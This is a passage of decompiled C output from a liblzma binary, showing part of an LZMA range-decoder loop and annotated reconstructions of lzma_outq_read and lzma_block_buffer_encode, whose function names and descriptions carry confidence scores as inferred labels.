                if (uVar28 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar28 = uVar28 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar40 = (uVar28 >> 0xb) * (uint)uVar5;
                bVar45 = uVar40 <= uVar39;
                uVar14 = uVar40;
                if (bVar45) {
                  uVar14 = uVar28 - uVar40;
                }
                uVar6 = *(ushort *)(param_1 + 0x6648);
                if (bVar45) {
                  uVar6 = *(ushort *)(param_1 + 0x664a);
                }
                uVar28 = (uint)uVar6;
                if (bVar45) {
                  uVar39 = uVar39 - uVar40;
                }
                uVar40 = (uint)bVar45;
                uVar18 = (ulong)uVar40;
                uVar30 = uVar5 - 0x7e1;
                if (bVar45) {
                  uVar30 = (uint)uVar5;
                }
                *(ushort *)(param_1 + 0x6646) = uVar5 - (short)(uVar30 >> 5);
                if (uVar14 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar14 = uVar14 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar31 = (uVar14 >> 0xb) * uVar28;
                bVar45 = uVar31 <= uVar39;
                uVar30 = uVar31;
                if (bVar45) {
                  uVar30 = uVar14 - uVar31;
                }
                uVar5 = *(ushort *)(param_1 + 0x664c + uVar18 * 2);
                if (bVar45) {
                  uVar5 = *(ushort *)(param_1 + 0x6650 + uVar18 * 2);
                }
                uVar14 = (uint)uVar5;
                if (bVar45) {
                  uVar40 = uVar40 + 2;
                  uVar39 = uVar39 - uVar31;
                }
                uVar43 = (ulong)uVar40;
                uVar31 = uVar28 - 0x7e1;
                if (bVar45) {
                  uVar31 = uVar28;
                }
                *(ushort *)(param_1 + 0x6648 + uVar18 * 2) = uVar6 - (short)(uVar31 >> 5);
                if (uVar30 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar30 = uVar30 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar31 = (uVar30 >> 0xb) * uVar14;
                bVar45 = uVar31 <= uVar39;
                uVar28 = uVar31;
                if (bVar45) {
                  uVar28 = uVar30 - uVar31;
                }
                uVar6 = *(ushort *)(param_1 + 0x6654 + uVar43 * 2);
                if (bVar45) {
                  uVar6 = *(ushort *)(param_1 + 0x665c + uVar43 * 2);
                }
                uVar30 = (uint)uVar6;
                if (bVar45) {
                  uVar40 = uVar40 + 4;
                  uVar39 = uVar39 - uVar31;
                }
                uVar31 = uVar14 - 0x7e1;
                if (bVar45) {
                  uVar31 = uVar14;
                }
                *(ushort *)(param_1 + 0x664c + uVar43 * 2) = uVar5 - (short)(uVar31 >> 5);
                if (uVar28 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar28 = uVar28 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar32 = (uVar28 >> 0xb) * uVar30;
                uVar28 = uVar28 - uVar32;
                uVar14 = uVar40 + 8;
                uVar31 = uVar39 - uVar32;
                if (uVar39 < uVar32) {
                  uVar30 = uVar30 - 0x7e1;
                  uVar14 = uVar40;
                  uVar31 = uVar39;
                  uVar28 = uVar32;
                }
                uVar39 = uVar31;
                uVar30 = uVar30 >> 5;
                *(ushort *)(param_1 + 0x6654 + (ulong)uVar40 * 2) = uVar6 - (short)uVar30;
                uVar40 = iVar13 * 0x10 + uVar14;
                if (uVar40 == 0xffffffff) {
                  local_a4 = 0;
                  uVar16 = uVar15;
                  uVar40 = local_ac;
                  local_78 = uVar33;
                  goto LAB_00120013;
                }
              }
            }
            puVar44 = (ushort *)(ulong)uVar40;
            local_78 = uVar33;
            if (puVar22 <= puVar44) {
              uVar18 = store_encoding_state
                                 (uVar15,*(undefined8 *)(param_1 + 0x6e98),uVar30,
                                  (long)pbVar41 - param_3,lVar36,param_4,puVar22,puVar46,uVar29,
                                  param_2,lVar48,uVar27,uVar40,local_ac);
              return uVar18;
            }
          }
          else {
            uVar28 = uVar28 - uVar14;
            uVar39 = uVar39 - uVar14;
            iVar13 = (uint)uVar5 - (uint)(uVar5 >> 5);
            *(short *)(lVar2 + 0x6180) = (short)iVar13;
            if (puVar22 == (ushort *)0x0) {
              uVar18 = store_encoding_state
                                 (iVar13,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                  (long)pbVar41 - param_3,lVar36,param_4,0,puVar46,uVar29,param_2,
                                  lVar48,uVar27);
              return uVar18;
            }
            if (uVar28 < 0x1000000) {
              bVar4 = *pbVar41;
              uVar28 = uVar28 * 0x100;
              pbVar41 = pbVar41 + 1;
              uVar39 = uVar39 * 0x100 | (uint)bVar4;
            }
            uVar5 = *(ushort *)(lVar2 + 0x6198);
            uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
            if (uVar39 < uVar14) {
              *(ushort *)(lVar2 + 0x6198) = uVar5 + (short)(0x800 - uVar5 >> 5);
              if (uVar14 < 0x1000000) {
                bVar4 = *pbVar41;
                uVar14 = uVar14 * 0x100;
                pbVar41 = pbVar41 + 1;
                uVar39 = uVar39 << 8 | (uint)bVar4;
              }
              uVar5 = *(ushort *)(lVar24 + 0x61e0);
              uVar28 = (uVar14 >> 0xb) * (uint)uVar5;
              if (uVar39 < uVar28) {
                *(ushort *)(lVar24 + 0x61e0) = uVar5 + (short)(0x800 - uVar5 >> 5);
                uVar27 = (-(uint)(uVar27 < 7) & 0xfffffffe) + 0xb;
                lVar24 = 0;
                if (local_70 <= (ushort *)(ulong)uVar15) {
                  lVar24 = lVar23;
                }
                *(undefined1 *)(lVar48 + (long)local_70) =
                     *(undefined1 *)((long)local_70 + lVar24 + lVar48 + (-1 - (long)(ulong)uVar15));
                if (cVar3 == '\0') goto LAB_0011ebd8;
                goto LAB_0011ec40;
              }
              uVar39 = uVar39 - uVar28;
              *(ushort *)(lVar24 + 0x61e0) = uVar5 - (uVar5 >> 5);
              uVar14 = uVar14 - uVar28;
              uVar40 = uVar15;
              uVar15 = local_ac;
              uVar16 = uVar33;
            }
            else {
              uVar28 = uVar28 - uVar14;
              uVar39 = uVar39 - uVar14;
              *(ushort *)(lVar2 + 0x6198) = uVar5 - (uVar5 >> 5);
              if (uVar28 < 0x1000000) {
                bVar4 = *pbVar41;
                uVar28 = uVar28 * 0x100;
                pbVar41 = pbVar41 + 1;
                uVar39 = uVar39 * 0x100 | (uint)bVar4;
              }
              uVar5 = *(ushort *)(lVar2 + 0x61b0);
              uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
              if (uVar39 < uVar14) {
                *(ushort *)(lVar2 + 0x61b0) = uVar5 + (short)(0x800 - uVar5 >> 5);
                uVar40 = local_ac;
                uVar16 = uVar33;
              }
              else {
                uVar28 = uVar28 - uVar14;
                uVar39 = uVar39 - uVar14;
                *(ushort *)(lVar2 + 0x61b0) = uVar5 - (uVar5 >> 5);
                if (uVar28 < 0x1000000) {
                  bVar4 = *pbVar41;
                  uVar28 = uVar28 * 0x100;
                  pbVar41 = pbVar41 + 1;
                  uVar39 = uVar39 * 0x100 | (uint)bVar4;
                }
                uVar5 = *(ushort *)(lVar2 + 0x61c8);
                uVar29 = (uVar28 >> 0xb) * (uint)uVar5;
                if (uVar39 < uVar29) {
                  *(ushort *)(lVar2 + 0x61c8) = uVar5 + (short)(0x800 - uVar5 >> 5);
                  uVar14 = uVar29;
                  uVar40 = uVar33;
                }
                else {
                  uVar14 = uVar28 - uVar29;
                  uVar39 = uVar39 - uVar29;
                  *(ushort *)(lVar2 + 0x61c8) = uVar5 - (uVar5 >> 5);
                  uVar40 = local_78;
                  local_78 = uVar33;
                }
              }
            }
            local_ac = uVar15;
            uVar27 = (-(uint)(uVar27 < 7) & 0xfffffffd) + 0xb;
            if (uVar14 < 0x1000000) {
              bVar4 = *pbVar41;
              uVar14 = uVar14 << 8;
              pbVar41 = pbVar41 + 1;
              uVar39 = uVar39 << 8 | (uint)bVar4;
            }
            uVar5 = *(ushort *)(param_1 + 0x6a68);
            puVar44 = (ushort *)(ulong)uVar40;
            uVar28 = (uVar14 >> 0xb) * (uint)uVar5;
            uVar15 = local_ac;
            if (uVar39 < uVar28) {
              lVar24 = param_1 + 0x6a6c + uVar43 * 0x10;
              *(ushort *)(param_1 + 0x6a68) = uVar5 + (short)(0x800 - uVar5 >> 5);
              uVar5 = *(ushort *)(lVar24 + 2);
              if (uVar28 < 0x1000000) {
                uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                uVar28 = uVar28 * 0x100;
                pbVar41 = pbVar41 + 1;
              }
              uVar33 = (uVar28 >> 0xb) * (uint)uVar5;
              bVar45 = uVar39 < uVar33;
              uVar14 = uVar33;
              if (!bVar45) {
                uVar14 = uVar28 - uVar33;
              }
              uVar6 = *(ushort *)(lVar24 + 4);
              if (!bVar45) {
                uVar6 = *(ushort *)(lVar24 + 6);
              }
              uVar29 = (uint)uVar6;
              uVar28 = uVar5 - 0x7e1;
              if (!bVar45) {
                uVar28 = (uint)uVar5;
                uVar39 = uVar39 - uVar33;
              }
              uVar33 = 3 - bVar45;
              *(ushort *)(lVar24 + 2) = uVar5 - (short)(uVar28 >> 5);
              if (uVar14 < 0x1000000) {
                uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                uVar14 = uVar14 << 8;
                pbVar41 = pbVar41 + 1;
              }
              uVar30 = (uVar14 >> 0xb) * uVar29;
              bVar45 = uVar39 < uVar30;
              uVar28 = uVar30;
              if (!bVar45) {
                uVar28 = uVar14 - uVar30;
              }
              uVar5 = *(ushort *)(lVar24 + (ulong)uVar33 * 4);
              if (!bVar45) {
                uVar5 = *(ushort *)(lVar24 + 2 + (ulong)uVar33 * 4);
              }
              uVar31 = (uint)uVar5;
              uVar14 = uVar39 - uVar30;
              if (bVar45) {
                uVar14 = uVar39;
              }
              uVar39 = uVar29 - 0x7e1;
              if (!bVar45) {
                uVar39 = uVar29;
              }
              *(ushort *)(lVar24 + (ulong)(uVar33 * 2)) = uVar6 - (short)(uVar39 >> 5);
              uVar33 = ((uVar33 * 2 + 1) - (uint)bVar45) * 2;
              if (uVar28 < 0x1000000) {
                uVar14 = CONCAT31((int3)uVar14,*pbVar41);
                uVar28 = uVar28 << 8;
                pbVar41 = pbVar41 + 1;
              }
              uVar29 = (uVar28 >> 0xb) * uVar31;
              uVar28 = uVar28 - uVar29;
              bVar45 = uVar14 < uVar29;
              uVar39 = uVar14 - uVar29;
              if (bVar45) {
                uVar39 = uVar14;
                uVar28 = uVar29;
              }
              uVar14 = uVar31 - 0x7e1;
              if (!bVar45) {
                uVar14 = uVar31;
              }
              uVar29 = (uVar33 - 5) - (uint)bVar45;
              *(ushort *)(lVar24 + (ulong)uVar33) = uVar5 - (short)(uVar14 >> 5);
            }
            else {
              uVar14 = uVar14 - uVar28;
              uVar39 = uVar39 - uVar28;
              *(ushort *)(param_1 + 0x6a68) = uVar5 - (uVar5 >> 5);
              if (uVar14 < 0x1000000) {
                bVar4 = *pbVar41;
                uVar14 = uVar14 * 0x100;
                pbVar41 = pbVar41 + 1;
                uVar39 = uVar39 * 0x100 | (uint)bVar4;
              }
              uVar5 = *(ushort *)(param_1 + 0x6a6a);
              uVar28 = (uVar14 >> 0xb) * (uint)uVar5;
              if (uVar39 < uVar28) {
                lVar24 = param_1 + 0x6b6c + uVar43 * 0x10;
                *(ushort *)(param_1 + 0x6a6a) = (short)(0x800 - uVar5 >> 5) + uVar5;
                uVar5 = *(ushort *)(lVar24 + 2);
                if (uVar28 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar28 = uVar28 * 0x100;
                  pbVar41 = pbVar41 + 1;
                }
                uVar33 = (uVar28 >> 0xb) * (uint)uVar5;
                bVar45 = uVar39 < uVar33;
                uVar14 = uVar33;
                if (!bVar45) {
                  uVar14 = uVar28 - uVar33;
                }
                uVar6 = *(ushort *)(lVar24 + 4);
                if (!bVar45) {
                  uVar6 = *(ushort *)(lVar24 + 6);
                }
                uVar29 = (uint)uVar6;
                uVar28 = uVar5 - 0x7e1;
                if (!bVar45) {
                  uVar28 = (uint)uVar5;
                  uVar39 = uVar39 - uVar33;
                }
                uVar33 = 3 - bVar45;
                *(ushort *)(lVar24 + 2) = uVar5 - (short)(uVar28 >> 5);
                if (uVar14 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar14 = uVar14 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar30 = (uVar14 >> 0xb) * uVar29;
                bVar45 = uVar39 < uVar30;
                uVar28 = uVar30;
                if (!bVar45) {
                  uVar28 = uVar14 - uVar30;
                }
                uVar5 = *(ushort *)(lVar24 + (ulong)uVar33 * 4);
                if (!bVar45) {
                  uVar5 = *(ushort *)(lVar24 + 2 + (ulong)uVar33 * 4);
                }
                uVar31 = (uint)uVar5;
                uVar14 = uVar39 - uVar30;
                if (bVar45) {
                  uVar14 = uVar39;
                }
                uVar39 = uVar29 - 0x7e1;
                if (!bVar45) {
                  uVar39 = uVar29;
                }
                *(ushort *)(lVar24 + (ulong)(uVar33 * 2)) = uVar6 - (short)(uVar39 >> 5);
                uVar33 = ((uVar33 * 2 + 1) - (uint)bVar45) * 2;
                if (uVar28 < 0x1000000) {
                  uVar14 = CONCAT31((int3)uVar14,*pbVar41);
                  uVar28 = uVar28 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar28 >> 0xb) * uVar31;
                uVar28 = uVar28 - uVar29;
                bVar45 = uVar14 < uVar29;
                uVar39 = uVar14 - uVar29;
                if (bVar45) {
                  uVar39 = uVar14;
                  uVar28 = uVar29;
                }
                uVar14 = uVar31 - 0x7e1;
                if (!bVar45) {
                  uVar14 = uVar31;
                }
                uVar29 = (uVar33 + 3) - (uint)bVar45;
                *(ushort *)(lVar24 + (ulong)uVar33) = uVar5 - (short)(uVar14 >> 5);
              }
              else {
                uVar14 = uVar14 - uVar28;
                uVar39 = uVar39 - uVar28;
                lVar24 = param_1 + 0x6c6c;
                *(ushort *)(param_1 + 0x6a6a) = uVar5 - (uVar5 >> 5);
                uVar5 = *(ushort *)(param_1 + 0x6c6e);
                if (uVar14 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar14 = uVar14 * 0x100;
                  pbVar41 = pbVar41 + 1;
                }
                uVar33 = (uVar14 >> 0xb) * (uint)uVar5;
                bVar45 = uVar39 < uVar33;
                uVar28 = uVar33;
                if (!bVar45) {
                  uVar28 = uVar14 - uVar33;
                }
                uVar6 = *(ushort *)(param_1 + 0x6c70);
                if (!bVar45) {
                  uVar6 = *(ushort *)(param_1 + 0x6c72);
                }
                uVar29 = (uint)uVar6;
                uVar14 = uVar5 - 0x7e1;
                if (!bVar45) {
                  uVar14 = (uint)uVar5;
                  uVar39 = uVar39 - uVar33;
                }
                uVar33 = 3 - bVar45;
                *(ushort *)(param_1 + 0x6c6e) = uVar5 - (short)(uVar14 >> 5);
                if (uVar28 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar28 = uVar28 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar30 = (uVar28 >> 0xb) * uVar29;
                bVar45 = uVar39 < uVar30;
                uVar14 = uVar30;
                if (!bVar45) {
                  uVar14 = uVar28 - uVar30;
                }
                uVar5 = *(ushort *)(lVar24 + (ulong)uVar33 * 4);
                if (!bVar45) {
                  uVar5 = *(ushort *)(param_1 + 0x6c6e + (ulong)uVar33 * 4);
                }
                uVar31 = (uint)uVar5;
                uVar28 = uVar39 - uVar30;
                if (bVar45) {
                  uVar28 = uVar39;
                }
                uVar39 = uVar29 - 0x7e1;
                if (!bVar45) {
                  uVar39 = uVar29;
                }
                uVar29 = (uVar33 * 2 + 1) - (uint)bVar45;
                *(ushort *)(lVar24 + (ulong)(uVar33 * 2)) = uVar6 - (short)(uVar39 >> 5);
                if (uVar14 < 0x1000000) {
                  uVar28 = CONCAT31((int3)uVar28,*pbVar41);
                  uVar14 = uVar14 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar33 = (uVar14 >> 0xb) * uVar31;
                bVar45 = uVar28 < uVar33;
                uVar39 = uVar33;
                if (!bVar45) {
                  uVar39 = uVar14 - uVar33;
                }
                uVar6 = *(ushort *)(lVar24 + (ulong)uVar29 * 4);
                if (!bVar45) {
                  uVar6 = *(ushort *)(param_1 + 0x6c6e + (ulong)uVar29 * 4);
                }
                uVar30 = (uint)uVar6;
                uVar14 = uVar28 - uVar33;
                if (bVar45) {
                  uVar14 = uVar28;
                }
                uVar28 = uVar31 - 0x7e1;
                if (!bVar45) {
                  uVar28 = uVar31;
                }
                uVar33 = (uVar29 * 2 + 1) - (uint)bVar45;
                *(ushort *)(lVar24 + (ulong)(uVar29 * 2)) = uVar5 - (short)(uVar28 >> 5);
                if (uVar39 < 0x1000000) {
                  uVar14 = CONCAT31((int3)uVar14,*pbVar41);
                  uVar39 = uVar39 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar39 >> 0xb) * uVar30;
                bVar45 = uVar14 < uVar29;
                uVar28 = uVar29;
                if (!bVar45) {
                  uVar28 = uVar39 - uVar29;
                }
                uVar5 = *(ushort *)(lVar24 + (ulong)uVar33 * 4);
                if (!bVar45) {
                  uVar5 = *(ushort *)(param_1 + 0x6c6e + (ulong)uVar33 * 4);
                }
                uVar31 = (uint)uVar5;
                uVar39 = uVar14 - uVar29;
                if (bVar45) {
                  uVar39 = uVar14;
                }
                uVar14 = uVar30 - 0x7e1;
                if (!bVar45) {
                  uVar14 = uVar30;
                }
                uVar29 = (uVar33 * 2 + 1) - (uint)bVar45;
                *(ushort *)(lVar24 + (ulong)(uVar33 * 2)) = uVar6 - (short)(uVar14 >> 5);
                if (uVar28 < 0x1000000) {
                  uVar39 = CONCAT31((int3)uVar39,*pbVar41);
                  uVar28 = uVar28 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar33 = (uVar28 >> 0xb) * uVar31;
                bVar45 = uVar39 < uVar33;
                uVar14 = uVar33;
                if (!bVar45) {
                  uVar14 = uVar28 - uVar33;
                }
                uVar6 = *(ushort *)(lVar24 + (ulong)uVar29 * 4);
                if (!bVar45) {
                  uVar6 = *(ushort *)(param_1 + 0x6c6e + (ulong)uVar29 * 4);
                }
                uVar30 = (uint)uVar6;
                uVar28 = uVar39 - uVar33;
                if (bVar45) {
                  uVar28 = uVar39;
                }
                uVar39 = uVar31 - 0x7e1;
                if (!bVar45) {
                  uVar39 = uVar31;
                }
                uVar33 = (uVar29 * 2 + 1) - (uint)bVar45;
                *(ushort *)(lVar24 + (ulong)(uVar29 * 2)) = uVar5 - (short)(uVar39 >> 5);
                if (uVar14 < 0x1000000) {
                  uVar28 = CONCAT31((int3)uVar28,*pbVar41);
                  uVar14 = uVar14 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar14 >> 0xb) * uVar30;
                bVar45 = uVar28 < uVar29;
                uVar39 = uVar29;
                if (!bVar45) {
                  uVar39 = uVar14 - uVar29;
                }
                uVar5 = *(ushort *)(lVar24 + (ulong)uVar33 * 4);
                if (!bVar45) {
                  uVar5 = *(ushort *)(param_1 + 0x6c6e + (ulong)uVar33 * 4);
                }
                uVar31 = (uint)uVar5;
                uVar14 = uVar28 - uVar29;
                if (bVar45) {
                  uVar14 = uVar28;
                }
                uVar28 = uVar30 - 0x7e1;
                if (!bVar45) {
                  uVar28 = uVar30;
                }
                uVar29 = (uVar33 * 2 + 1) - (uint)bVar45;
                *(ushort *)(lVar24 + (ulong)(uVar33 * 2)) = uVar6 - (short)(uVar28 >> 5);
                if (uVar39 < 0x1000000) {
                  uVar14 = CONCAT31((int3)uVar14,*pbVar41);
                  uVar39 = uVar39 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar33 = (uVar39 >> 0xb) * uVar31;
                bVar45 = uVar14 < uVar33;
                uVar28 = uVar33;
                if (!bVar45) {
                  uVar28 = uVar39 - uVar33;
                }
                uVar6 = *(ushort *)(lVar24 + (ulong)uVar29 * 4);
                if (!bVar45) {
                  uVar6 = *(ushort *)(param_1 + 0x6c6e + (ulong)uVar29 * 4);
                }
                uVar30 = (uint)uVar6;
                uVar33 = uVar14 - uVar33;
                if (bVar45) {
                  uVar33 = uVar14;
                }
                uVar39 = uVar31 - 0x7e1;
                if (!bVar45) {
                  uVar39 = uVar31;
                }
                *(ushort *)(lVar24 + (ulong)(uVar29 * 2)) = uVar5 - (short)(uVar39 >> 5);
                uVar14 = ((uVar29 * 2 + 1) - (uint)bVar45) * 2;
                if (uVar28 < 0x1000000) {
                  uVar33 = CONCAT31((int3)uVar33,*pbVar41);
                  uVar28 = uVar28 << 8;
                  pbVar41 = pbVar41 + 1;
                }
                uVar29 = (uVar28 >> 0xb) * uVar30;
                uVar28 = uVar28 - uVar29;
                bVar45 = uVar33 < uVar29;
                uVar39 = uVar33 - uVar29;
                if (bVar45) {
                  uVar39 = uVar33;
                  uVar28 = uVar29;
                }
                uVar33 = uVar30 - 0x7e1;
                if (!bVar45) {
                  uVar33 = uVar30;
                }
                uVar29 = (uVar14 - 0xed) - (uint)bVar45;
                *(ushort *)(lVar24 + (ulong)uVar14) = uVar6 - (short)(uVar33 >> 5);
              }
            }
          }
          local_ac = uVar15;
          sVar26 = (long)puVar46 - (long)local_70;
          if ((ulong)uVar29 < (ulong)((long)puVar46 - (long)local_70)) {
            sVar26 = (ulong)uVar29;
          }
          lVar24 = (long)local_70 + (-1 - (long)puVar44);
          uVar14 = (uint)sVar26;
          uVar29 = uVar29 - uVar14;
          if (local_70 <= puVar44) {
            lVar24 = lVar23 + lVar24;
          }
          if (uVar40 < uVar14) {
            puVar21 = (undefined1 *)(lVar48 + lVar24);
            do {
              puVar20 = puVar21 + 1;
              *(undefined1 *)(((long)puVar21 - lVar24) + (long)local_70) = *puVar21;
              puVar21 = puVar20;
            } while ((undefined1 *)(lVar48 + 1 + (ulong)(uVar14 - 1) + lVar24) != puVar20);
            sVar26 = (ulong)(uVar14 - 1) + 1;
            puVar35 = puVar22;
          }
          else {
            memcpy((void *)(lVar48 + (long)local_70),(void *)(lVar48 + lVar24),sVar26);
            puVar35 = puVar22;
          }
          puVar44 = (ushort *)((long)local_70 + sVar26);
          puVar22 = puVar44 - 0x120;
          if (cVar3 != '\0') {
            puVar22 = puVar35;
          }
          uVar15 = uVar40;
          uVar33 = uVar16;
          if (uVar29 != 0) goto LAB_0011f72f;
        }
        uVar43 = (ulong)(uVar17 & (uint)puVar44);
        local_70 = puVar44;
      } while (pbVar41 < pbVar19);
      uVar49 = (ulong)uVar27;
      uVar47 = (ulong)uVar29;
      local_70 = puVar44;
    }
  } while( true );
}



/* ==================== I/O ==================== */

/**
 * @name  lzma_outq_read
 * @brief Reads from the head of the output queue, copies data via lzma_bufcpy, removes completed nodes.
 * @confidence 72%
 * @classification io
 * @address 0x00109d70
 */

undefined4
FUN_00109d70(long *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
            undefined8 param_5,undefined8 *param_6,undefined8 *param_7)

{
  undefined4 uVar1;
  long lVar2;
  
  if ((int)param_1[6] == 0) {
    return 0;
  }
  lVar2 = *param_1;
  lzma_bufcpy(lVar2 + 0x40,param_1 + 2,*(undefined8 *)(lVar2 + 0x18),param_3,param_4,param_5);
  if ((*(char *)(lVar2 + 0x28) != '\0') && (*(ulong *)(lVar2 + 0x18) <= (ulong)param_1[2])) {
    if (param_6 != (undefined8 *)0x0) {
      *param_6 = *(undefined8 *)(lVar2 + 0x30);
    }
    if (param_7 != (undefined8 *)0x0) {
      *param_7 = *(undefined8 *)(lVar2 + 0x38);
    }
    uVar1 = *(undefined4 *)(lVar2 + 0x2c);
    lzma_dec_remove_node(param_1,param_2);
    param_1[2] = 0;
    return uVar1;
  }
  return 0;
}



/**
 * @name  lzma_block_buffer_encode
 * @brief Encodes LZMA block into buffer. Tries compressed encoding first, falls back to uncompressed if larger. Writes block header, data, padding, and check value (CRC/SHA). Validates all parameters.
 * @confidence 93%
 * @classification io
 * @address 0x0010a1b0
 */

/* Encodes an LZMA block into a buffer. Attempts compressed encoding first if try_compress is set,
   falls back to uncompressed if compressed would be larger. Writes block header, data, padding
   bytes, and check value (CRC/SHA). Validates all parameters and size constraints. */

ulong lzma_block_buffer_encode
                (uint *param_1,undefined8 param_2,long param_3,ulong param_4,long param_5,
                ulong *param_6,ulong param_7,char param_8)

{
  void *__src;
  undefined8 uVar1;
  char cVar2;
  undefined1 uVar3;
  uint uVar4;
  int iVar5;
  ulong uVar6;
  long lVar7;
  long lVar8;
  size_t __n;
  ulong uVar9;
  undefined8 *puVar10;
  ulong __n_00;
  long in_FS_OFFSET;
  byte bVar11;
  undefined8 local_120;
  undefined1 local_118 [16];
  undefined1 local_108 [16];
  undefined1 local_f8 [16];
  undefined1 local_e8 [16];
  undefined1 local_d8 [16];
  undefined8 local_a8;
  undefined1 *local_a0;
  undefined8 local_98;
  long local_40;
  
  bVar11 = 0;
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 == (uint *)0x0) {
LAB_0010a4e0:
    uVar6 = 0xb;
  }
  else {
    if ((param_3 == 0) && (uVar6 = 0xb, param_4 != 0)) goto LAB_0010a4b0;
    if ((param_5 == 0) || (param_6 == (ulong *)0x0)) goto LAB_0010a4e0;
    uVar9 = *param_6;
    uVar6 = 0xb;
    if ((param_7 < uVar9) || (uVar6 = 8, 1 < *param_1)) goto LAB_0010a4b0;
    uVar4 = param_1[2];
    uVar6 = 0xb;
    if ((0xf < uVar4) || ((param_8 != '\0' && (*(long *)(param_1 + 8) == 0)))) goto LAB_0010a4b0;
    cVar2 = lzma_check_is_supported(uVar4);
    uVar6 = 3;
    if (cVar2 == '\0') goto LAB_0010a4b0;
    lVar8 = param_7 - ((int)param_7 - (int)uVar9 & 3);
    uVar4 = lzma_check_size(uVar4);
    __n_00 = (ulong)uVar4;
    uVar6 = 10;
    if (lVar8 - uVar9 <= __n_00) goto LAB_0010a4b0;
    lVar8 = lVar8 - __n_00;
    *(ulong *)(param_1 + 6) = param_4;
    if (0x7ffffffffffffbbc < param_4) {
      param_1[4] = 0;
      param_1[5] = 0;
      uVar6 = 9;
      goto LAB_0010a4b0;
    }
    lVar7 = lzma_block_compress_bound(param_4);
    *(long *)(param_1 + 4) = lVar7;
    if (lVar7 == 0) {
      uVar6 = 9;
      goto LAB_0010a4b0;
    }
    if (param_8 == '\0') {
LAB_0010a328:
      local_a8 = 0x21;
      puVar10 = (undefined8 *)local_118;
      for (lVar7 = 0xe; lVar7 != 0; lVar7 = lVar7 - 1) {
        *puVar10 = 0;
        puVar10 = puVar10 + (ulong)bVar11 * -2 + 1;
      }
      local_a0 = local_118;
      local_118._0_4_ = 0x1000;
      uVar1 = *(undefined8 *)(param_1 + 8);
      local_98 = 0xffffffffffffffff;
      *(undefined8 **)(param_1 + 8) = &local_a8;
      iVar5 = lzma_block_header_size(param_1);
      if (iVar5 != 0) {
        *(undefined8 *)(param_1 + 8) = uVar1;
        uVar6 = 0xb;
        goto LAB_0010a4b0;
      }
      if (lVar8 - *param_6 < (ulong)param_1[1] + *(long *)(param_1 + 4)) {
        *(undefined8 *)(param_1 + 8) = uVar1;
        uVar6 = 10;
        goto LAB_0010a4b0;
      }
      iVar5 = lzma_block_header_encode(param_1,param_5 + *param_6);
      *(undefined8 *)(param_1 + 8) = uVar1;
      if (iVar5 != 0) goto LAB_0010a4e0;
      uVar6 = (ulong)param_1[1] + *param_6;
      *param_6 = uVar6;
      if (param_4 != 0) {
        uVar9 = 0;
        uVar3 = 1;
        do {
          __n = param_4 - uVar9;
          *param_6 = uVar6 + 1;
          __src = (void *)(param_3 + uVar9);
          *(undefined1 *)(param_5 + uVar6) = uVar3;
          uVar6 = *param_6;
          if (0x10000 < __n) {
            __n = 0x10000;
          }
          *param_6 = uVar6 + 1;
          uVar9 = uVar9 + __n;
          *(char *)(param_5 + uVar6) = (char)(__n - 1 >> 8);
          uVar6 = *param_6;
          *param_6 = uVar6 + 1;
          *(char *)(param_5 + uVar6) = (char)__n - 1;
          memcpy((void *)(*param_6 + param_5),__src,__n);
          uVar6 = __n + *param_6;
          uVar3 = 2;
          *param_6 = uVar6;
        } while (uVar9 < param_4);
      }
      *param_6 = uVar6 + 1;
      *(undefined1 *)(param_5 + uVar6) = 0;
    }
    else {
      uVar6 = lzma_block_header_size(param_1);
      if ((int)uVar6 != 0) {
LAB_0010a6b3:
        if ((int)uVar6 != 10) goto LAB_0010a4b0;
        goto LAB_0010a328;
      }
      uVar9 = *param_6;
      if (lVar8 - uVar9 <= (ulong)param_1[1]) goto LAB_0010a328;
      uVar6 = param_1[1] + uVar9;
      *param_6 = uVar6;
      local_118 = ZEXT816(0xffffffffffffffff) << 0x40;
      lVar7 = uVar6 + *(ulong *)(param_1 + 4);
      if (lVar8 - uVar6 <= *(ulong *)(param_1 + 4)) {
        lVar7 = lVar8;
      }
      local_108 = (undefined1  [16])0x0;
      local_f8 = (undefined1  [16])0x0;
      local_e8 = (undefined1  [16])0x0;
      local_d8 = (undefined1  [16])0x0;
      uVar4 = lzma_next_filter_init(local_118,param_2,*(undefined8 *)(param_1 + 8));
      if (uVar4 == 0) {
        local_120 = 0;
        uVar4 = (*(code *)local_108._8_8_)
                          (local_118._0_8_,param_2,param_3,&local_120,param_4,param_5,param_6,lVar7,
                           3);
        lzma_next_coder_end(local_118,param_2);
        if (uVar4 != 1) {
          if (uVar4 != 0) goto LAB_0010a6ab;
          *param_6 = uVar9;
          goto LAB_0010a328;
        }
      }
      else {
        lzma_next_coder_end(local_118,param_2);
        if (uVar4 != 1) {
LAB_0010a6ab:
          uVar6 = (ulong)uVar4;
          *param_6 = uVar9;
